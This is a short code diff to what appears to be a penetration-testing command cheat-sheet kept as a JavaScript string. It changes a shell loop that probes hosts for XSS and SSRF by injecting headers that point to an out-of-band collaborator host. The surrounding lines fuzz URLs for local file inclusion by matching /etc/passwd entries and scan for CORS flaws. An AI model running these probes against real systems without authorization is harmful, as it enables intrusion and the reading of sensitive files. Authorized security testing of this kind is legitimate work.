@@ -146,7 +146,7 @@ $ cat hosts_alive.txt | xargs -I % curl -I % -H "X-Forwarded-Host: {{COLLAB}}" -
 $ cat all{{TARGET}}urls.txt | grep "=" | qsreplace {{COLLAB}} | httpx
 $ cat all{{TARGET}}urls.txt | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w /mnt/d/Desktop/lostsec-payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
 $ python ~/Corsy/corsy.py -i hosts_alive.txt -o corsy_results.txt 
-$ cat hosts_alive.txt | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: {{COLLAB}}'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: {{COLLAB}}'|grep xss) xss3=$(curl -s -L $url -H 'Host: {{COLLAB}}'|grep xss) xss4=$(curl -s -L $url --request-target http://{{COLLAB}}/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://{{COLLAB}} HTTP/1.1 ""\n";done
+$ cat hosts_alive.txt | while read url; do echo -e "\033[1;32m$url\033[0m"; xss1=$(curl -s -L "$url" -H 'X-Forwarded-For: {{COLLAB}}' | grep xss); xss2=$(curl -s -L "$url" -H 'X-Forwarded-Host: {{COLLAB}}' | grep xss); xss3=$(curl -s -L "$url" -H 'Host: {{COLLAB}}' | grep xss); xss4=$(curl -s -L "$url" --request-target http://{{COLLAB}}/ --max-time 2); echo "Method[1] X-Forwarded-For: xss+ssrf => $xss1"; echo "Method[2] X-Forwarded-Host: xss+ssrf => $xss2"; echo "Method[3] Host: xss+ssrf => $xss3"; echo "Method[4] GET request-target => $xss4"; done
 $ sif -d {{TARGET}}
     `.trim();
 
